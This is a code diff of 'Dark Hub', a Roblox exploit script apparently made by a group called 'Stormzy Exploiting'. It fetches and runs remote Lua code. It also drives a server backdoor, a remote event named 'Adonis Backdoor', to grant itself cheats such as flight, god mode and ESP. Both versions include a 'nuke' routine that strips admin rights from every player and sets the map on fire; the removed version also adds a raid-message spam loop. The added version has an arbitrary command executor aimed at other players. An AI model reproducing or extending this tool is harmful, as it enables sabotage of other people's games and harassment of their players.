@@ -1,235 +1,342 @@
-getgenv().SecureMode = true
-local DarkHub = loadstring(game:HttpGet('https://raw.githubusercontent.com/DarkHub-Roblox/Premium-Frontend/refs/heads/main/source.lua'))()
-local Patched = false
+--[[
+██████╗  █████╗ ██████╗ ██╗  ██╗    ██╗  ██╗██╗   ██╗██████╗ 
+██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██║  ██║██║   ██║██╔══██╗
+██║  ██║███████║██████╔╝█████╔╝     ███████║██║   ██║██████╔╝
+██║  ██║██╔══██║██╔══██╗██╔═██╗     ██╔══██║██║   ██║██╔══██╗
+██████╔╝██║  ██║██║  ██║██║  ██╗    ██║  ██║╚██████╔╝██████╔╝
+╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝  
+Script Name: HubSource.lua
+Author: Destin & Soup
+Invite: discord.gg/KuWFCrSb3T
+]]--
 
-local Window = DarkHub:CreateWindow({
+-- UI Loader
+local arrayField = loadstring(game:HttpGet('https://raw.githubusercontent.com/UI-Interface/ArrayField/main/Source.lua'))()
+
+-- Variables
+local coreGui = game:GetService("CoreGui")
+local httpService = game:GetService("HttpService")
+local lighting = game:GetService("Lighting")
+local players = game:GetService("Players")
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local runService = game:GetService("RunService")
+local guiService = game:GetService("GuiService")
+local statsService = game:GetService("Stats")
+local starterGui = game:GetService("StarterGui")
+local teleportService = game:GetService("TeleportService")
+local tweenService = game:GetService("TweenService")
+local userInputService = game:GetService('UserInputService')
+local gameSettings = UserSettings():GetService("UserGameSettings")
+
+local localPlayer = players.LocalPlayer
+local currentTime = 12
+local adonisCommand = "nil"
+local adonisPlayer = "nil"
+local noclipEnabled = false
+local versionActive = true
+
+-- Window Creation
+local Window = arrayField:CreateWindow({
 	Name = "Dark Hub",
 	LoadingTitle = "Dark Hub",
-	LoadingSubtitle = "Premium Edition",
+	LoadingSubtitle = "by Stormzy Exploiting",
 	ConfigurationSaving = {
 		Enabled = true,
-		FolderName = "DarkHub", -- Create a custom folder for your hub/game
-		FileName = "PREMIUM"
+		FolderName = true,
+		FileName = "Configuration"
 	},
 	Discord = {
-		Enabled = true,
-		Invite = "KuWFCrSb3T", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
-		RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+		Enabled = false,
+		Invite = "noinvitelink",
+		RememberJoins = true
 	},
-	KeySystem = true, -- Set this to true to use our key system
+	KeySystem = false,
 	KeySettings = {
-		Title = "Dark Hub",
+		Title = "Untitled",
 		Subtitle = "Key System",
-		Note = "Please complete the whitelist to gain access to Dark Hub.",
-		FileName = "DarkHub", -- It is recommended to use something unique as other scripts using DarkHub may overwrite your key file
-		SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
-		GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like DarkHub to get the key from
+		Note = "No method of obtaining the key is provided",
+		FileName = "Key", 
+		SaveKey = true,
+		GrabKeyFromSite = false,
 		Actions = {
-			--[[[1] = {
+			[1] = {
 				Text = 'Click here to copy the key link <--',
 				OnPress = function()
 					print('Pressed')
 				end,
-			}--]]
+			}
 		},
-		Key = {
-            "3a01c6e3-d874-4e7f-987f-2bb6a4f89b12", 
-            "c5e19c5a-7e8d-4fa9-9d2d-1e43d9e8b6b3", 
-            "7e95b1a4-2c4d-476b-a4c5-91f2d1b7b459", 
-            "17a2fc6d-c273-4bde-99f3-3b2c9e7a4e23", 
-            "b3a85d72-09b6-4f92-921a-83f6d8c12e15", 
-            "64d13e8b-4a5d-4aef-8e0f-b4e13d9b5d81", 
-            "2c19f3b4-1a6d-4e5d-912e-d8f5c2a4b367", 
-            "f7d12b3c-8c5a-45fe-90d1-b1a29e4d9c74", 
-            "a2b64e9d-7d43-48ea-b6c5-3c5d9f2b1a63"
-        }
-        
-    }
+		Key = {"Hello"}
+	}
 })
 
-local Tab = Window:CreateTab("Home", 4370319235) --4483345743 Title, Image
-local Tab = Window:CreateTab("Physics", 4370319235) --4483345743 Title, Image
+local homeTab = Window:CreateTab("Home", 4370319235)
+local characterTab = Window:CreateTab("Character", 4370319235)
 
-local Slider = Tab:CreateSlider({
-	Name = "Walkspeed",
-	Range = {0, 200},
-	Increment = 5,
-	Suffix = "",
+local playerSpeedSlider = characterTab:CreateSlider({
+	Name = "Player Speed",
+	Range = {0, 300},
+	Increment = 1,
+	Suffix = "player speed",
 	CurrentValue = 16,
-	Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+	Flag = "Slider1",
 	Callback = function(Value)
-		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
-	end,
-})
-
-local Toggle = Tab:CreateToggle({
-	Name = "Flight",
-	CurrentValue = false,
-	Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
-	Callback = function(Value)
-		if Value == true then
-			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":fly "..game.Players.LocalPlayer.Name})
-		else
-			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":unfly "..game.Players.LocalPlayer.Name})
+		if versionActive == true then
+			localPlayer.Character.Humanoid.WalkSpeed = Value
+		elseif versionActive == false then
+			return error("DarkHub | DarkHub is currently patched... please visit our Communications Server for more information.")
 		end
 	end,
 })
 
-local Toggle = Tab:CreateToggle({
+local jumpPowerSlider = characterTab:CreateSlider({
+	Name = "Jump Power",
+	Range = {0, 350},
+	Increment = 1,
+	Suffix = "jump power",
+	CurrentValue = 50,
+	Flag = "Slider1",
+	Callback = function(Value)
+		if versionActive == true then
+			localPlayer.Character.Humanoid.JumpPower = Value
+		elseif versionActive == false then
+			return error("DarkHub | DarkHub is currently patched... please visit our Communications Server for more information.")
+		end
+	end,
+})
+
+local flightSpeedSlider = characterTab:CreateSlider({
+	Name = "Flight Speed",
+	Range = {1, 25},
+	Increment = 1,
+	Suffix = "flight speed",
+	CurrentValue = 3,
+	Flag = "Slider1",
+	Callback = function(Value)
+		if versionActive == true then
+			replicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommandAsPlayer", {Command = ":flyspeed me", Player = game.Players[localPlayer.Name], Args = Value})
+		elseif versionActive == false then
+			return error("DarkHub | DarkHub is currently patched... please visit our Communications Server for more information.")
+		end
+	end,
+})
+
+local fieldOfViewSlider = characterTab:CreateSlider({
+	Name = "Field of View",
+	Range = {45, 120},
+	Increment = 1,
+	Suffix = "field of view",
+	CurrentValue = 70,
+	Flag = "Slider1",
+	Callback = function(Value)
+		if versionActive == true then
+			replicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommandAsPlayer", {Command = ":fov me", Player = game.Players[localPlayer.Name], Args = Value})
+		elseif versionActive == false then
+			return error("DarkHub | DarkHub is currently patched... please visit our Communications Server for more information.")
+		end
+	end,
+})
+
+local noclipToggle = characterTab:CreateToggle({
 	Name = "Noclip",
 	CurrentValue = false,
-	Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+	Flag = "Toggle1",
 	Callback = function(Value)
-		if Value == true then
-			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":noclip "..game.Players.LocalPlayer.Name})
-		else
-			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":clip "..game.Players.LocalPlayer.Name})
+		if versionActive == true then
+			if Value == true then
+				replicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommandAsPlayer", {Command = ":noclip me", Player = game.Players[localPlayer.Name], Args = ""})
+			elseif Value == false then
+				replicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommandAsPlayer", {Command = ":clip me", Player = game.Players[localPlayer.Name], Args = ""})
+			end
+		elseif versionActive == false then
+			return error("DarkHub | DarkHub is currently patched... please visit our Communications Server for more information.")
 		end
 	end,
 })
 
-local Toggle = Tab:CreateToggle({
-	Name = "God",
+local flightToggle = characterTab:CreateToggle({
+	Name = "Flight",
 	CurrentValue = false,
-	Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+	Flag = "Toggle1",
 	Callback = function(Value)
-		if Value == true then
-			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":god "..game.Players.LocalPlayer.Name})
-		else
-			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":ungod "..game.Players.LocalPlayer.Name})
+		if versionActive == true then
+			if Value == true then
+				replicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommandAsPlayer", {Command = ":fly me", Player = game.Players[localPlayer.Name], Args = "3 true"})
+			elseif Value == false then
+				flightSpeedSlider:Set(3) -- The new slider integer value
+                replicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommandAsPlayer", {Command = ":unfly me", Player = game.Players[localPlayer.Name], Args = "3 true"})
+			end
+		elseif versionActive == false then
+			return error("DarkHub | DarkHub is currently patched... please visit our Communications Server for more information.")
 		end
 	end,
 })
 
-local Input = Tab:CreateInput({
+local refreshButton = characterTab:CreateButton({
+	Name = "Refresh",
+	Interact = 'Click',
+	Callback = function()
+		if versionActive == true then
+			replicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommandAsPlayer", {Command = ":ref me", Player = game.Players[localPlayer.Name], Args = ""})
+		elseif versionActive == false then
+			return error("DarkHub | DarkHub is currently patched... please visit our Communications Server for more information.")
+		end
+	end,
+})
+
+local respawnButton = characterTab:CreateButton({
+	Name = "Respawn",
+	Interact = 'Click',
+	Callback = function()
+		if versionActive == true then
+			replicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommandAsPlayer", {Command = ":res me", Player = game.Players[localPlayer.Name], Args = ""})
+		elseif versionActive == false then
+			return error("DarkHub | DarkHub is currently patched... please visit our Communications Server for more information.")
+		end
+	end,
+})
+
+local respawnButton = characterTab:CreateButton({
+	Name = "Invulnerability",
+	Interact = 'Click',
+	Callback = function()
+		if versionActive == true then
+			replicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommandAsPlayer", {Command = ":god me", Player = game.Players[localPlayer.Name], Args = ""})
+		elseif versionActive == false then
+			return error("DarkHub | DarkHub is currently patched... please visit our Communications Server for more information.")
+		end
+	end,
+})
+
+local respawnButton = characterTab:CreateButton({
 	Name = "Fling",
-	PlaceholderText = "Username",
-	NumbersOnly = false, -- If the user can only type numbers. Remove or set to false if none.
-	CharacterLimit = false, --max character limit. Remove or set to false
-	OnEnter = true, -- Will callback only if the user pressed ENTER while being focused on the the box.
-	RemoveTextAfterFocusLost = true, -- Speaks for itself.
-	Callback = function(Text)
-		game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":fling "..Text})
-	end,
-})
-
-local Button = Tab:CreateButton({
-	Name = "Nuke",
 	Interact = 'Click',
 	Callback = function()
-		if Patched == false then
-			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":nuke "..game.Players.LocalPlayer.Name})
+		if versionActive == true then
+			replicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommandAsPlayer", {Command = ":fling me", Player = game.Players[localPlayer.Name], Args = ""})
+		elseif versionActive == false then
+			return error("DarkHub | DarkHub is currently patched... please visit our Communications Server for more information.")
 		end
 	end,
 })
 
-local Button = Tab:CreateButton({
-	Name = "Building Tools",
-	Interact = 'Click',
-	Callback = function()
-		if Patched == false then
-			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":btools "..game.Players.LocalPlayer.Name})
+local extrasensoryPerceptionToggle = characterTab:CreateToggle({
+	Name = "Extrasensory Perception",
+	CurrentValue = false,
+	Flag = "Toggle1",
+	Callback = function(Value)
+		if versionActive == true then
+			if Value == true then
+				replicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommandAsPlayer", {Command = ":esp all", Player = game.Players[localPlayer.Name], Args = ""})
+			elseif Value == false then
+				replicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommandAsPlayer", {Command = ":unesp all", Player = game.Players[localPlayer.Name], Args = ""})
+			end
+		elseif versionActive == false then
+			return error("DarkHub | DarkHub is currently patched... please visit our Communications Server for more information.")
 		end
 	end,
 })
 
-local Toggle = Tab:CreateToggle({
+local invisibilityButton = characterTab:CreateToggle({
 	Name = "Invisibility",
 	CurrentValue = false,
-	Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+	Flag = "Toggle1",
 	Callback = function(Value)
-		if Value == true then
-			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":invisible "..game.Players.LocalPlayer.Name})
-		else
-			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":visible "..game.Players.LocalPlayer.Name})
-		end
-	end,
-})
-
-local Tab = Window:CreateTab("Nametag", 4370319235) -- Title, Image
-
-local Input = Tab:CreateInput({
-	Name = "Username",
-	PlaceholderText = game.Players.LocalPlayer.Name,
-	NumbersOnly = false, -- If the user can only type numbers. Remove or set to false if none.
-	CharacterLimit = 15, --max character limit. Remove or set to false
-	OnEnter = true, -- Will callback only if the user pressed ENTER while being focused on the the box.
-	RemoveTextAfterFocusLost = false, -- Speaks for itself.
-	Callback = function(Text)
-		-- The function that takes place when the input is changed
-		-- The variable (Text) is a string for the value in the text box
-	end,
-})
-
-local Tab = Window:CreateTab("Adonis Admin", 4370319235) -- Title, Image
-
-local Input = Tab:CreateInput({
-	Name = "Add Creator Admin",
-	PlaceholderText = "Username",
-	NumbersOnly = false, -- If the user can only type numbers. Remove or set to false if none.
-	CharacterLimit = false, --max character limit. Remove or set to false
-	OnEnter = true, -- Will callback only if the user pressed ENTER while being focused on the the box.
-	RemoveTextAfterFocusLost = true, -- Speaks for itself.
-	Callback = function(Text)
-		if Patched == false then
-			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("AddAdmin", {plr = game.Players[Text], level = 1500})
-		end
-	end,
-})
-
-local Input = Tab:CreateInput({
-	Name = "Add Admin",
-	PlaceholderText = "Username",
-	NumbersOnly = false, -- If the user can only type numbers. Remove or set to false if none.
-	CharacterLimit = false, --max character limit. Remove or set to false
-	OnEnter = true, -- Will callback only if the user pressed ENTER while being focused on the the box.
-	RemoveTextAfterFocusLost = true, -- Speaks for itself.
-	Callback = function(Text)
-		if Patched == false then
-			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("AddAdmin", {plr = game.Players[Text], level = 300})
-		end
-	end,
-})
-
-local Input = Tab:CreateInput({
-	Name = "Remove Admin",
-	PlaceholderText = "Username",
-	NumbersOnly = false, -- If the user can only type numbers. Remove or set to false if none.
-	CharacterLimit = false, --max character limit. Remove or set to false
-	OnEnter = true, -- Will callback only if the user pressed ENTER while being focused on the the box.
-	RemoveTextAfterFocusLost = true, -- Speaks for itself.
-	Callback = function(Text)
-		if Patched == false then
-			game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("AddAdmin", {plr = game.Players[Text], level = 0})
-		end
-	end,
-})
-
-if game.Players.LocalPlayer.Name == "TimoClipz" then
-	print("hi")
-	local Tab = Window:CreateTab("Stormzy Exploiting", 4384394237)
-	local Button = Tab:CreateButton({
-		Name = "Nuke",
-		Interact = 'Click',
-		Callback = function()
-			if Patched == false then
-				for i,v in pairs(game.Players:GetPlayers()) do
-					game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("AddAdmin", {plr = v, level = 0})
-				end
-				game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":countdown 3"})
-				wait(3)
-				game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":nuke "..game.Players.LocalPlayer.Name})
-				for i,v in pairs(game.Workspace:GetChildren()) do
-					if v:IsA("Part") or v:IsA("Union") then
-						v.Material = "CorrodedMetal"
-					end
-					Instance.new("Fire").Parent = v
-				end
-				while wait(0.1) do
-					game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommand", {playername = "System", command = ":n RAIDED BY STORMZY EXPLOITING"})
-				end
+		if versionActive == true then
+			if Value == true then
+				replicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommandAsPlayer", {Command = ":invisible me", Player = game.Players[localPlayer.Name], Args = ""})
+			elseif Value == false then
+				replicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommandAsPlayer", {Command = ":visible me", Player = game.Players[localPlayer.Name], Args = ""})
 			end
-		end,
-	})
-	local Tab = Window:CreateTab("Dark Hub Admin", 4384394237)
+		elseif versionActive == false then
+			return error("DarkHub | DarkHub is currently patched... please visit our Communications Server for more information.")
+		end
+	end,
+})
+
+local nightAndDayButton = characterTab:CreateButton({
+	Name = "Night and Day",
+	Interact = 'Click',
+	Callback = function()
+		if versionActive == true then
+			if currentTime == 12 then
+				currentTime = 24
+				replicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommandAsPlayer", {Command = ":time", Player = game.Players[localPlayer.Name], Args = currentTime})
+			else
+				currentTime = 12
+				replicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommandAsPlayer", {Command = ":time", Player = game.Players[localPlayer.Name], Args = currentTime})
+			end
+		elseif versionActive == false then
+			return error("DarkHub | DarkHub is currently patched... please visit our Communications Server for more information.")
+		end
+	end,
+})
+
+local hardcoreTab = Window:CreateTab("Hardcore Scripts", 4370319235)
+
+local nukeButton = hardcoreTab:CreateButton({
+	Name = "Nuke Script",
+	Interact = 'Click',
+	Callback = function()
+		if versionActive == true then
+            for i,v in pairs(game.Players:GetPlayers()) do
+                game.ReplicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("AddAdmin", {Player = v, Level = 0})
+            end
+			replicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommandAsPlayer", {Command = ":nuke me", Player = game.Players[localPlayer.Name], Args = ""})
+            for i,v in pairs(game.Workspace:GetChildren()) do
+                if v:IsA("Part") or v:IsA("Union") or v:IsA("MeshPart") then
+                    v.Material = "CorrodedMetal"
+                    Instance.new("Fire").Parent = v
+                end
+            end
+		elseif versionActive == false then
+			return error("DarkHub | DarkHub is currently patched... please visit our Communications Server for more information.")
+		end
+	end,
+})
+
+local adonisEssentialsTab = Window:CreateTab("Adonis Essentials", 4370319235)
+
+local targetUsernameInput = adonisEssentialsTab:CreateInput({
+    Name = "Target Username",
+    PlaceholderText = "Username",
+    NumbersOnly = false, -- If the user can only type numbers. Remove or set to false if none.
+    CharacterLimit = false, --max character limit. Remove or set to false
+    OnEnter = false, -- Will callback only if the user pressed ENTER while being focused on the the box.
+    RemoveTextAfterFocusLost = false, -- Speaks for itself.
+    Callback = function(Text)
+        adonisPlayer = Text
+    end,
+ })
+
+ local commandInput = adonisEssentialsTab:CreateInput({
+    Name = "Command",
+    PlaceholderText = "Command",
+    NumbersOnly = false, -- If the user can only type numbers. Remove or set to false if none.
+    CharacterLimit = false, --max character limit. Remove or set to false
+    OnEnter = false, -- Will callback only if the user pressed ENTER while being focused on the the box.
+    RemoveTextAfterFocusLost = false, -- Speaks for itself.
+    Callback = function(Text)
+        adonisCommand = Text
+    end,
+ })
+
+local executeButton = adonisEssentialsTab:CreateButton({
+	Name = "Execute",
+	Interact = 'Click',
+	Callback = function()
+		if versionActive == true then
+            if string.find(adonisCommand, "nuke") then
+                return error()
+            end
+            replicatedStorage.DarkHub["Adonis Backdoor"]:FireServer("RunCommandAsPlayer", {Command = adonisCommand, Player = game.Players[adonisPlayer], Args = ""})
+		elseif versionActive == false then
+			return error("DarkHub | DarkHub is currently patched... please visit our Communications Server for more information.")
+		end
+	end,
+})
+
+nukeButton:Lock("This feature isn't available at the moment. ")
+if localPlayer.Name ~= "TimoClipz" or localPlayer.DisplayName ~= "fufu" then
+    executeButton:Lock("This feature isn't available at the moment. ")
 end
